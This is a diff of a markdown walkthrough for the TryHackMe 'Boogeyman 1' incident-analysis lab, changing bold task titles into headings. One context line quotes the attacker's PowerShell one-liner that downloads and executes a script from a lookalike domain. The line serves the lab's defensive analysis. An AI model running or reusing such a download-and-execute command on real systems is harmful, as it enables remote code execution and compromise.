@@ -7,7 +7,7 @@ Room link: https://tryhackme.com/room/boogeyman1
 <br /><br /><br />
 
 
-**Task 1 [Introduction] New threat in town.**
+# Task 1 [Introduction] New threat in town.
 
 <br />
 
@@ -60,7 +60,7 @@ Let’s hunt that boogeyman!
 
 <br /><br /><br />
 
-**Task 2 [Email Analysis] Look at that headers!**
+# Task 2 [Email Analysis] Look at that headers!
 
 <br />
 
@@ -156,7 +156,7 @@ iex (new-object net.webclient).downloadstring(‘http://files.bpakcaging.xyz/upd
 
 <br /><br /><br />
 
-**Task 3 [Endpoint Security] Are you sure that’s an invoice?**
+# Task 3 [Endpoint Security] Are you sure that’s an invoice?
 
 <br />
 
@@ -267,7 +267,7 @@ Searching online would give the type of file that uses the said file extension
 
 <br /><br /><br />
 
-**Task 4 [Network Traffic Analysis] They got us. Call the bank immediately!**
+# Task 4 [Network Traffic Analysis] They got us. Call the bank immediately!
 
 <br />
 
